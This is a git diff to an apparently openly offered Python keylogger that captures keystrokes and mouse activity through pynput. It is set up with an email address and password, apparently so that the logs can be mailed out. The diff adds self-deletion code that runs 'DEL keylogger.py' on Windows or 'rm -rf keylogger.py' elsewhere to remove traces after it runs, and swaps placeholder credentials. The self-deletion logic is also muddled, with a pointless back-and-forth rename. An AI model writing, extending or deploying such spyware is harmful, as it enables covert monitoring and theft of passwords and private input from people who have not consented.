@@ -3,6 +3,7 @@ import threading
 from pynput import keyboard
 from pynput.mouse import Listener
 import logging
+import os
 
 
 class KeyLogger:
@@ -60,7 +61,24 @@ class KeyLogger:
             keyboard_listener.join()
         with Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as mouse_listener:
             mouse_listener.join()
+        if os.name == "nt":
+            try:
+                os.system("YOUR DIRECTORY")
+                os.rename('keylogger.py', 'keylogger.bat')
+                os.rename('keylogger.bat', 'keylogger.py')
+            except OSError:
+                print('File is still open.')
+                os.system("DEL keylogger.py")
+
+        else:
+            try:
+                os.system("YOUR DIRECTORY")
+                os.rename('keylogger.py', 'keylogger.bat')
+                os.rename('keylogger.bat', 'keylogger.py')
+            except OSError:
+                print('File is still open.')
+                os.system("rm -rf keylogger.py")
 
 
-keylogger = KeyLogger(10, 'MAIL', 'PASSWORD')
+keylogger = KeyLogger(10, 'YOUR MAIL', 'PASSWORD')
 keylogger.run()
